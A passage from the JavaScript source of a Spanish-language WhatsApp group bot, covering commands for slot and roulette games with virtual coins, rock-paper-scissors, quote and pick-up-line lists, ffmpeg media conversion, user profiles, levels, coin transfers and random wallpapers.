		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇'
		] 
const gnd = [
        '🍇 : 🍇 : 🍇',
	    '🍐 : 🍐 : 🍐',
		'🔔 : 🔔 : 🔔',
		'🍒 : 🍒 : 🍒',
		'🍊 : 🍊 : 🍊',
		'🍌 : 🍌 : 🍌'
		]
	const pbb = prd[Math.floor(Math.random() * prd.length)]
	const pbbn = prd[Math.floor(Math.random() * prd.length)]
	const pvv = gnd[Math.floor(Math.random() * gnd.length)]     

    if (pn < 100) return reply(`╭─╼┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┝╾─╮
╽ ┌──────────┐ ┃
        🍋 : 🍌 : 🍍
┃ ├──────────┤ ┃
        ${pbb}
┃ ├──────────┤ ┃
        ${pbbn}
╿ └──────────┘ ╿
╰──┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┠──╯

Lo siento, no has logrado alinear, buena suerte la próxima ✨`)
    cnf.sendMessage(from, `╭─╼┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┝╾─╮
╽ ┌──────────┐ ┃
        🍋 : 🍌 : 🍍
┃ ├──────────┤ ┃
        ${pvv}
┃ ├──────────┤ ┃
        ${pbbn}
╿ └──────────┘ ╿
╰──┥𝐂𝐀𝐒𝐒𝐈𝐍𝐎┠──╯    

Felicidades, has logrado ganar 500 coins`, text, { quoted: freply })
    addKoinUser(sender, 500)
                    addFilter(from)
          break

case prefix+'tomp3':
if (isBanned) return  reply(mess.banned)        
if (!isRegistered) return reply(ind.noregis())	
		  
            if (!isQuotedVideo) return fakegroup('Etiqueta un video')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await cnf.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            cnf.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            addFilter(from)
          break

case prefix+'juego':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
	  
	reply(`𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 ??𝑰𝑱𝑬𝑹𝑨 :

𝑷𝑨𝑹𝑨 𝑱𝑼𝑮𝑨𝑹 𝑼𝑻𝑰𝑳𝑰𝒁𝑨 𝑼𝑵𝑶 𝑫𝑬 𝑬𝑺𝑻𝑶𝑺 𝑬𝑴𝑶𝑱𝑰𝑺
		    
𝑷𝑰𝑬𝑫𝑹𝑨 : #✊
		   
𝑷𝑨𝑷𝑬𝑳 : #✋
		   
𝑻𝑰𝑱𝑬𝑹𝑨 : #✌

𝗡𝗢𝗧𝗔: en este juego no se puede ganar coins️`)
addFilter(from)
          break
		  
		   case prefix+'✊':		
		   if (isBanned) return  reply(mess.banned)   
          
if (!isRegistered) return reply(ind.noregis())			  
const piedra =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :0 𝑬𝒎𝒑𝒂𝒕𝒆`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n :( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`]
    const jg = piedra[Math.floor(Math.random() * piedra.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰𝑱𝑬𝑹𝑨\n\n` + jg, text)
    addFilter(from)
          break
    
    case prefix+'✋':    
    if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
const papel =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n  :0 𝑬𝒎𝒑𝒂𝒕𝒆`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`]
    const jggg = papel[Math.floor(Math.random() * papel.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰??𝑬𝑹𝑨\n\n` + jggg, text)
    addFilter(from)
          break
    
    case prefix+'✌️': 
    if (isBanned) return  reply(mess.banned)
          
if (!isRegistered) return reply(ind.noregis())			  
    const tijera =[`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✋\n\n:( 𝑮𝒂𝒏𝒂𝒔 𝒕𝒖`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✊\n\n :) 𝑮𝒂𝒏𝒆 𝒉𝒖𝒎𝒂𝒏𝒐 𝒆𝒔𝒕𝒖𝒑𝒊𝒅𝒐`,`𝒀𝒐 𝒆𝒍𝒊𝒋𝒐 : ✌️\n\n:0 𝑬𝒎𝒑𝒂𝒕𝒆 `]
    const jgg = tijera[Math.floor(Math.random() * tijera.length)]
    cnf.sendMessage(from, `𝑷𝑰𝑬𝑫𝑹𝑨 𝑷𝑨𝑷𝑬𝑳 𝑶 𝑻𝑰𝑱𝑬𝑹𝑨\n\n` + jgg, text)
    addFilter(from)
          break

                case prefix+'frases': 
                if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
			  
				cnf.updatePresence(from, Presence.composing) 
				const fra =['El amor inmaduro dice: "te amo porque te necesito". El amor maduro dice: "te necesito porque te amo" (Erich Fromm)','La vida empieza cada cinco minutos (Andreu Buenafuente)','Donde las palabras fallan la música habla (Hans Christian Andersen)','Un buen viajante no tiene planes (Confucio)','Una vez aceptamos nuestros límites, vamos más allá de ello (Albert Einstein)','Lo que no nos mata nos hace más fuertes (Friedrich Nietzsche)','Si caminas solo, irás más rápido. Si caminas acompañado, llegarás más lejos.','Una vida llena de errores no solo es más honorable, sino que es más sabia que una vida gastada sin hacer nada','Es sencillo hacer que las cosas sean complicadas, pero difícil hacer que sean sencillas. F. Nietzsche','No pierdas nunca el sentido del humor y aprende a reírte de tus propios defectos','La preocupación es como una mecedora, te mantiene ocupado pero no te lleva a ninguna parte','El hombre que más ha vivido no es aquel que más años ha cumplido, sino aquel que más ha experimentado la vida','Si lo puedes soñar, lo puedes hacer','Lo imposible es el fantasma de los tímidos y el refugio de los cobardes','El camino que nos toca recorrer está lleno de sorpresas. Nunca vas a estar preparado para las que te toquen a ti, sean dichosas o sombrías, pues eso es parte de adquirir experiencia. Y descubrir cuán gratas o desafortunadas son las que te esperan, es algo nunca podrás evadir','La felicidad no es algo que pospones para el futuro, es algo que diseñas para el presente','El amigo ha de ser como el dinero, que antes de necesitarle, se sabe el valor que tiene','Tus acciones serán el reflejo de la manera que tienes de ver la vida y las que te van definir ante los demás. No las malgastes en cosas y actitudes que no valen la pena, solo tú puedes decidir la forma en la que quieres que te recuerden, porque no estarás en este mundo para siempre','El amor es lo que mueve al mundo aunque a veces parezca lo contrario. A las personas no nos haría mal recordar esto de vez en cuando','Nunca terminas de conocer a la gente. Tus amigos, tu familia y hasta tú mismo, pueden ocultar sorpresas que en la vida te podrías haber imaginado, tanto buenas como malas','Todos tenemos el mismo destino, en esencia no hay manera de diferenciarnos si nacemos para llorar y reír. Recuérdalo, todos tenemos los días contados, vive cada uno de tus días como si fueran el regalo más grande, porque nadie puede asegurarte el mañana','Mientras vivas vas a encontrarte con todo tipo de personas, tanto buenas como malas. Es imposible adivinar las intenciones que oculta alguien detrás de su comportamiento, pero descubrirlo es la tarea más interesante y peligrosa con la que te puedes llegar a topar','Los tiempos felices en la humanidad son las páginas vacías de la historia','La decepción después de un amor fallido, puede llegar a oprimir tu corazón hasta el punto de no dejarte respirar. Pero nadie se ha muerto de amor','No llores por la gente que se ha ido, enfócate en quienes se encuentran a tu lado en el presente y quédate con los buenas recuerdos de los que se marcharon','No debes enfocarte en el dolor que puedes sentir si alguien te ha falla. Si no eres capaz de perdonar una equivocación, entiérrala y sigue adelante','Amar es la aventura más grande en la que te puedes embarcar. Porque te puede hacer volar más alto de lo que jamás imaginarte y también ponerte los pies de la tierra']
 				const jys = fra[Math.floor(Math.random() * fra.length)]
			    ses = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, ses, image, { caption: '*ᖴᏒᏗᏕᏋᏕ ૮ᏬᏒᎥᎧᏕᏗᏕ👌*\n\n'+ jys, quoted: mek })
              addFilter(from)
          break

case prefix+'frases2': 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
		  
cnf.updatePresence(from, Presence.composing) 
const frs2 = [`☁️¿Alguna vez se han puesto mirar el cielo con atención?\n\n ¿Han notado que no parece real?\nParece una pintura,\nuna pintura de acuarelas💙🎨`,`💙No le digas a nadie que lo supere; ayúdale a superarlo.\n\nMuchas veces nos quedamos en el territorio del mero aliento o en el de las simples palabras de ánimo cuando, en realidad,\nlo que la otra persona necesita de ti es que te remangues y le ayudes de verdad a salir del pozo✨`,`📸Somos una generación\nde fotos felices ,y corazones tristes🎞🥀`,`🌷𝗡𝗼 𝗱𝗲𝘀𝗲𝗼 𝗾𝘂𝗲 𝗹𝗮𝘀 𝗺𝘂𝗷𝗲𝗿𝗲𝘀 𝘁𝗲𝗻𝗴𝗮𝗻 𝗺𝗮𝘀 𝗽𝗼𝗱𝗲𝗿𝗲𝘀 𝘀𝗼𝗯𝗿𝗲 𝗹𝗼𝘀 𝗵𝗼𝗺𝗯𝗿𝗲𝘀....\n\n𝗦𝗶𝗻𝗼 𝗾𝘂𝗲 𝘁𝗲𝗻𝗴𝗮𝗻 𝗺á𝘀\n𝗣𝗢𝗗𝗘𝗥 𝘀𝗼𝗯𝗿𝗲 𝘀𝗶 𝗠𝗜𝗦𝗠𝗔𝗦🤍👑`,`SI FUERA LA PRIMERA VEZ:\n\nConoces los zapatos,que llevas puesto,no es la primera vez q te los pones.Ni la segunda.Y por eso al llegar a tu casa te las quita con ayuda del otro pie,ni siquiera te preocupas si se están ensuciando.\n\nPero si fuera la primera vez q te los pones,te los quitarías delicadamente.Solo si fuera la primera vez.Ahora no.Ahora llegas después de un día agotador y lanzas en teléfono  a la cama,pero si fuera nuevo lo dejarias en la mesa,y hasta tendrías miedo a que se raye.\n\nY lo mismo pasa con las personas ,con tu pareja,con la familia.\n\nSABEMOS QUE ESTAN ALLÍ ,\n  Y dejamos de mirarlos como si fuera\n        LA PRIMERA VEZ♥️`,`🌹Las personas sensibles tienen una característica:\n\nsufren mucho más que los demás, pero también se regocijan con intensidad similar de la felicidad ajena, disfrutándola como si fuera suya.\n\nLa sensibilidad es como la facultad de ver en un mundo de ciegos♥️`,`🍎La vida es el eco, \nlo que envías es lo que regresa, \nlo que das es lo que recibes...\n\nPor eso nunca des a los demás \nlo que no quieras para ti ♥️::✨`,`Así como en la vida existe el\n" pasado, presente y futuro" ,\n\nen los sentimientos está el \n"perdona, olvida y continua"♥️`,`•💘•\n\nMás que un lavado de manos,\nel mundo necesita un lavado de\n\n                                            CORAZÒN✨`,`🎈Aprende a soltar al amor de tu vida que según tú es el correcto pero en realidad ya se volvió costumbre,\n no te idealices con una persona si no has vivido nuevas experiencias con otras, \nno te cierres y pienses que los amores que vendrán son solo a medias. \nVive, date y quiérete♥️::✨`,`⌛️El tiempo cura lo que el corazón destroza....\n\nY aun así,siguen hablando mal del tiempo y bien del amor💚::🌿`,`♻️ Yo lo llamo “Karma”...\n\nPero la biblia dice :\n\n“Cosecharás lo que Siembras”🌱💚`,`🪀Tenía la creencia de que si no te metías con nadie, nadie se metía contigo.\n\nPero no es así, \nporque hay gente a la que le molesta tu felicidad, \ntu físico, tu esencia, tus gustos, \nqué haces y que dejas de hacer✨🎍`,`💡Todo el tiempo estamos diciendo\n "El físico no importa"...\n\npero no la pasamos leyendo o viendo (películas -series) ,donde los protagonistas son de cuerpos de infarto y belleza descomunal🌿.`,`☕️El café nunca se imaginó que podría tener un sabor tan suave,\nhasta que conoció el azúcar y la leche.\n\nTodos somos buenos individualmente,\npero nos volvemos mejores cuando nos\nmezclamos con las personas apropiadas🤎🤍`,`📕Ꮮᗩ  ᗰᗩᏀᏆᗩ  ᗞᗴ  Ꮮᗴᗴᖇ ....\n\nᗴᔑᎢÁ  ᗴᑎ  ᗴᑎᑕᝪᑎᎢᖇᗩᖇ  ᖇᗴᖴᑌᏀᏆᝪ \n\n[ᗴᑎ  Ꮮᗩᔑ  ᏞᗴᎢᖇᗩᔑ  ᗞᗴ  ᝪᎢᖇᝪᔑ✍🏻♥️]`,`♥️Las mujeres son como las canciones de Arjona....\n\nsi eres paciente y las escuchas, \nte darás cuenta \nde lo perfectas que son📀✨`,`𝗘𝗹 𝗔𝗺𝗼𝗿 𝗻𝗼 𝗱𝗲𝘀𝘁𝗿𝘂𝘆𝗲 𝗮 𝗹𝗮𝘀 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘀...\n\n𝗟𝗮𝘀 𝗽𝗲𝗿𝘀??𝗻𝗮𝘀 𝗱𝗲𝘀𝘁𝗿𝘂𝘆𝗲𝗻 𝗮 𝗹𝗮𝘀 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘀🤍`,`🌵✨El perdón te libera de la maldad ajena,\n aunque la otra persona no se arrepienta de lo que hizo...\n\nY tú perdonas porque sabes que es lo mejor para tu salud. \nPerdonar no es necesariamente olvidar. \nQuizás lo recuerdes por siempre, \npero sin tristeza ,\n ni amargura en el corazón💚✅`,`❌Cuidado con la gente que \nte acelere el corazón  sin tocarte.\n\n\nDuele el doble \ncuando desaparecen de golpe🥀`,`Una vez alguien me dijo:\n\nSi quieres que alguien te busque, deja de buscarle. \n\nSi quieres que alguien te quiera, deja de quererle. \n\nY si quieres que alguien regrese, \ndeja de rogarle....(ironías de la vida) \n\nY ahí entendí todo🤍✨`,`🍓La vida es como una caja de Pandora:\n\n    impredecible, \n        peligrosa, \n          y \n           llena de retos mentales y físicos♥️`,`🌹☕️Recuerda: \n\nNo importa que tan buena persona seas.\nTodos somos los malos en la historia de alguien.\nAsí que disfruta tu rol ,\ny al menos se un villano memorable.`,`“Donde hay amor, hay paz” ....\n\ndijeron alguna vez los labios de alguien\nHay personas que podrían estar de acuerdo...\n\nHay personas que lo \n     encontrarían confuso💜`,`Siempre llega quien rompe todos tus miedos, \ntus inseguridades \ny hace que olvides el daño que alguna vez te hicieron, \ncon sus mimos, sus besos y abrazos, sus pequeños detalles que te alegran la vida y todo ese amor que guarda para hacerte feliz, \ny así, claro que te quedas🎆💜`,`🌹Hazlo, comete errores, \nvuelve a intentarlo, \nfalla, manda todo a la mierda,\n y empieza otra vez si es necesario. \n\n     En serio, no pasa nada🩹☺️♥️`,`Estoy cansada de escuchar que siempre digan las mismas frases de "busca a alguien que te de paz", \n"si no te da tranquilidad no es la persona indicada". \n\nQuién quiere paz?\nA quién le gustan las relaciones lineadas y monótonas que viven en un punto exacto de equilibrio, \ndonde no existen los sube y baja? \nYo realmente no podría. \nYo necesito que mi relación sea una montaña rusa de emociones, \na veces en paz, otras guerra, hoy ganas de tú, mañana gano yo, \npasado toca empatar y empezar de cero, \npero siempre sin dejar de vivir. \nSon iguales de importantes los momentos de cariño cómo los de discusión. \nPorque sino fuera por las renconciliaciones donde el amor siempre sabe mejor, \nno tendría sentido nada, \nya la vida es demasiado monótona como para que las relaciones también lo sean\n\nMi consejo:\nSi te da paz y tranquilidad...ahí no es🤎`]
  				const fras2 = frs2[Math.floor(Math.random() * frs2.length)]
			    ses = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, ses, image, { caption: '*ᖴᏒᏗᏕᏋᏕ ૮ᏬᏒᎥᎧᏕᏗᏕ 2👌*\n\n'+ fras2, quoted: mek })
              addFilter(from)
          break


case prefix+'piropos':   
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
		  
				cnf.updatePresence(from, Presence.composing) 				
				const mary =['Algunos quieren ser ricos a través del dinero, otros del poder, pero lo que no saben, es que la única riqueza es tu amor verdadero.','Soñando contigo he tenido una revelación, ahora necesito que me hagas un hueco en tu corazón.','Aunque por tu corazón han pasado muchas personas, me gustaría que me hicieses un huequecito eterno, por pequeño que sea, por si pasa algo, para que no me olvides jamás.','Lo que siento por ti es tan inmenso que, para guardarlo, me haría falta otro universo.','me he convertido en un capitán pirata para asaltar tu corazón y robarle el amor.','Me preguntaste por qué te amaba y no pude responderte. Hoy entiendo que el amor verdadero es indescriptible, solo se puede sentir.','Ojalá fuese papel para poder envolverte, bombón.','Ansío besarte, abrazarte y no soltarte','A lo mejor mi hogar no es un palacio, pero me gustaría que tú fueses mi princesa.','Te amo demasiado, lo deseo todo contigo, por eso me vuelvo loc@, cuando tú no estás conmigo.','¿De casualidad tienes un mapa contigo? Porque tengo el interés de navegar por esa linda mirada','Desde que te he visto me he convertido un/a astronauta porque no he bajado de las galaxias','A pesar de que el cielo está lleno de estrellas, tú eres la más importante para mi','Si ser guapo fuera pcado, ya estarías haciendo penitencia','Los que dicen que Disneyland es el lugar más feliz del mundo no han estado junto a ti🥺','Si ser guapo matara, serías la bomba atómica😳','Si fuera gato, pasaría mis nueve vidas contigo','¿Y si nos comemos unos tacos y yo te a-taco a besos?']
				const js = mary[Math.floor(Math.random() * mary.length)]
			    wew = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, wew, image, { caption: '*ᎮᎥᏒᎧᎮᎧᏕ👌*\n\n'+ js, quoted: mek })
              addFilter(from)
          break

case prefix+'toimg':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	
		  	
				if (!isQuotedSticker) return reply(' etiqueta un sticker')
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await cnf.downloadAndSaveMediaMessage(encmedia)
				ran= getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return reply(' Fallo ')
				buffer = fs.readFileSync(ran)
				cnf.sendMessage(from, buffer, image, {quoted: mek, caption: '🌸Watame-BOT🌸'})
				fs.unlinkSync(ran)
			    })
				await limitAdd(sender) 
				addFilter(from)
          break


    			case prefix+'perfil':
    			if (isBanned) return  reply(mess.banned)
    				cnf.updatePresence(from, Presence.composing)
				      
if (!isRegistered) return reply(ind.noregis())			  
    				try {
					profil = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					   const uaangku = checkATMuser(sender)
					profile = `╭─「 *PERFIL* 」
│• *Nombre:* ${pushname}
│• *Rol :${role}*
│• *Usuario registrado:* ✅
│• *Tu Dinero: Rp${uaangku}*
│• *XP: ${getLevelingXp(sender)}*
│• *Level: ${getLevelingLevel(sender)}*				
│• *Link:* wa.me/${sender.split("@")[0]}
╰─────────────────────`
	 				buff = await getBuffer(profil)
					cnf.sendMessage(from, buff, image, {quoted: mek, caption: profile})
					addFilter(from)
          break

			                case prefix+'leveling':
			                if (isBanned) return  reply(mess.banned)
                if (!isGroup) return reply(mess.only.group)
		     if (!isGroupAdmins) return reply(mess.only.admin)			
                if (args.length < 1) return reply('activar oh desactivar')
                if (args[0] === 'activar') {
                if (isLevelingOn) return reply('*la función de nivel ha estado activa antes*')
                 	   _leveling.push(from)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                  	   reply(ind.lvlon())
              	  } else if (args[0] === 'desactivar') {
                  	  _leveling.splice(from, 1)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                 	    reply(ind.lvloff())
             	   } else {
                 	   reply(ind.satukos())
                	}
				addFilter(from)
          break 
          
          case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('¿Qué quieres buscar?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Ocurre un error o no se encuentran resultados_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Resultados de búsqueda de :* ${teks}`})
}
}
break

				case prefix+'yo':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
                
                if (!isLevelingOn) return reply(ind.lvlnoon())
			     if (!isGroup) return reply(mess.only.group)			     
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                resul = `┏━━❉ *LEVEL* ❉━━\n┣⊱ *Nombre* : ${pushname}\n┣⊱ Numero : ${sender.split("@")[0]}\n┣⊱ Rol :  ${role}\n┣⊱ User Level : ${userLevel}\n┗━━━━━━━━━━━━`
                costum(resul, text, tescuk, per)
				addFilter(from)
          break 
            
				case prefix+'transferir':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('La cantidad debe ser un número!!')
                if (jumblah < 100 ) return reply(`Transferencia mínima 100`)
                if (jumblah > 5000 ) return reply(`Transferencia máxima 5000`)
                if (checkATMuser(sender) < jumblah) return reply(`No tienes suficiente dinero para realizar la transferencia`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005 *  jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('+51931655706@s.whatsapp.net', fee)
                reply(`*「 ÉXITO 」*\n\nLa transferencia de dinero ha sido exitosa\n\nDe : +${sender.split("@")[0]}\nPara : +${tujuan}\n\nmonto de la transferencia : ${jumblah}\nimpuesto : ${fee}%`)
                addFilter(from)
          break
			
				case prefix+'cartera':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				addFilter(from)
          break

	case prefix+'ruleta':
	if (isBanned) return  reply(mess.banned)
	if (!isRegistered) return reply(ind.noregis())
     const dinn = ['1','1','1','1000','1','1','1']    
  const holi = dinn[Math.floor(Math.random() * dinn.length)]
 if (holi < 5) return reply(`★᭄ꦿ𝐑𝐎𝐔𝐋𝐄𝐓𝐓𝐄💸

-🥀Lo siento🥀
-🥀${pushname}
-🥀As perdido
-🥀No recibes ningun premio
-🥀Gracias por jugar`)
 
reply(`★᭄ꦿ𝐑𝐎𝐔𝐋𝐄𝐓𝐓𝐄💸

-🥀Felicidades 🎉 
-🥀${pushname}
-🥀As Ganado!! 🎉
-🥀Tu premio : 1000 coins`)
addKoinUser(sender, 1000)
addFilter(from)
          break
					
case prefix+'wallpaper':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())				
if (!isBotGroupAdmins) return reply(mess.only.Badmin)				
const canogti = ['https://i.ibb.co/6JTzpJJ/68.jpg','https://i.ibb.co/S7CXQmD/15.jpg','https://i.ibb.co/yP4fMMS/18.jpg','https://i.ibb.co/zRHq0qK/47.jpg','https://i.ibb.co/vD00z3C/10.jpg','https://i.ibb.co/NjLb90d/54.jpg','https://i.ibb.co/QDRJmYb/73.jpg','https://i.ibb.co/LkDygnF/39.jpg','https://i.ibb.co/jTqjqLq/58.jpg','https://i.ibb.co/2twGcMw/86.jpg','https://i.ibb.co/vwBDKRf/71.jpg','https://i.ibb.co/JCwQfcZ/9.jpg','https://i.ibb.co/Y8sm3k8/64.jpg','https://i.ibb.co/60LsdQq/76.jpg','https://i.ibb.co/mG8xMC9/5.jpg','https://i.ibb.co/8jM2Wnq/62.jpg','https://i.ibb.co/XWd1wyB/23.jpg','https://i.ibb.co/J36Qvy0/63.jpg','https://i.ibb.co/zRFXfXB/75.jpg','https://i.ibb.co/SNkpKBM/43.jpg','https://i.ibb.co/Yc1ntvk/21.jpg','https://i.ibb.co/ZV0KBN8/44.jpg','https://i.ibb.co/ByScQYM/56.jpg','https://i.ibb.co/gvr3grn/100.jpg','https://i.ibb.co/Mp6kM0S/98.jpg','https://i.ibb.co/str6WsD/93.jpg','https://i.ibb.co/xf1tqN8/53.jpg','https://i.ibb.co/BntKBDt/3.jpg','https://i.ibb.co/cQ2QrfN/103.jpg','https://i.ibb.co/kKMYf84/7.jpg','https://i.ibb.co/C2dJXLM/33.jpg','https://i.ibb.co/ykzwZ08/67.jpg','https://i.ibb.co/qM4z8GC/25.jpg','https://i.ibb.co/w0bPg7H/38.jpg','https://i.ibb.co/QmL9QT2/72.jpg','https://i.ibb.co/Qk4qKWh/85.jpg','https://i.ibb.co/QPyjj7M/29.jpg','https://i.ibb.co/pPKRz5x/46.jpg','https://i.ibb.co/52X0QGk/27.jpg','https://i.ibb.co/tK1XmTS/13.jpg','https://i.ibb.co/b5KFHHy/55.jpg','https://i.ibb.co/ZRD9Z7M/51.jpg','https://i.ibb.co/JH8D2Js/87.jpg','https://i.ibb.co/X38B1Ns/81.jpg','https://i.ibb.co/9Ztpn3y/2.jpg','https://i.ibb.co/g7P9NT4/26.jpg','https://i.ibb.co/j5m8sgf/8.jpg','https://i.ibb.co/njnkMWC/32.jpg','https://i.ibb.co/M80BmZZ/16.jpg','https://i.ibb.co/tQqGkCf/77.jpg','https://i.ibb.co/S6Np1Vm/49.jpg','https://i.ibb.co/TbkQk71/90.jpg','https://i.ibb.co/1GVqwsn/50.jpg','https://i.ibb.co/mb0Xr9X/59.jpg','https://i.ibb.co/WnDMywW/4.jpg','https://i.ibb.co/rbBvMX4/84.jpg','https://i.ibb.co/7twNvNX/74.jpg','https://i.ibb.co/jRKDHRz/48.jpg','https://i.ibb.co/KqqYTWk/89.jpg','https://i.ibb.co/qMQNSjG/12.jpg','https://i.ibb.co/FgNw4hb/11.jpg','https://i.ibb.co/9NW9VnZ/17.jpg','https://i.ibb.co/jMc9vdx/95.jpg','https://i.ibb.co/BskF3jg/104.jpg','https://i.ibb.co/yV56m6S/99.jpg','https://i.ibb.co/5GCxFC5/19.jpg','https://i.ibb.co/8mKGXzg/31.jpg','https://i.ibb.co/4VWX6dn/34.jpg','https://i.ibb.co/fq6LjHw/82.jpg','https://i.ibb.co/CbbP0QB/80.jpg','https://i.ibb.co/vPqyBCK/36.jpg','https://i.ibb.co/k5QxxBb/57.jpg','https://i.ibb.co/WymrdBf/102.jpg','https://i.ibb.co/cth1cwb/79.jpg','https://i.ibb.co/dJRTT6f/83.jpg','https://i.ibb.co/55szk9F/91.jpg','https://i.ibb.co/sgTbTLb/65.jpg','https://i.ibb.co/8rLfBDy/24.jpg','https://i.ibb.co/W0zbd1J/66.jpg','https://i.ibb.co/g7523mx/14.jpg','https://i.ibb.co/nB8CzdY/22.jpg','https://i.ibb.co/prbLDzX/101.jpg','https://i.ibb.co/r2sZVDR/37.jpg','https://i.ibb.co/t2pn4dL/94.jpg','https://i.ibb.co/F0CkFPp/35.jpg','https://i.ibb.co/7nwhZ3w/96.jpg','https://i.ibb.co/89r7C2b/20.jpg','https://i.ibb.co/TTYYgP3/69.jpg','https://i.ibb.co/JKp6Hqr/52.jpg','https://i.ibb.co/k8FknTC/41.jpg','https://i.ibb.co/37Nk23b/6.jpg','https://i.ibb.co/zSC3dHS/88.jpg','https://i.ibb.co/dLNthzx/60.jpg','https://i.ibb.co/3RPnFTc/105.jpg','https://i.ibb.co/kHbRF4Z/28.jpg','https://i.ibb.co/XYx1rFS/1.jpg','https://i.ibb.co/pxtTK6j/40.jpg','https://i.ibb.co/tKTjL9s/30.jpg','https://i.ibb.co/FHZt6NH/45.jpg','https://i.ibb.co/3kV41Nj/42.jpg','https://i.ibb.co/WDGcQ4X/78.jpg','https://i.ibb.co/XYh4fqF/70.jpg','https://i.ibb.co/B3rHm58/61.jpg','https://i.ibb.co/Vqxn77Z/97.jpg','https://i.ibb.co/DQ5P1Xq/92.jpg']
let canbgtip = canogti[Math.floor(Math.random() * canogti.length)]
h = await getBuffer(canbgtip)
cnf.sendMessage(from, h, image, {quote: mek})
await limitAdd(sender)
addFilter(from)
break

case prefix+'yaoi':
if (isBanned) return  reply(mess.banned)   
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
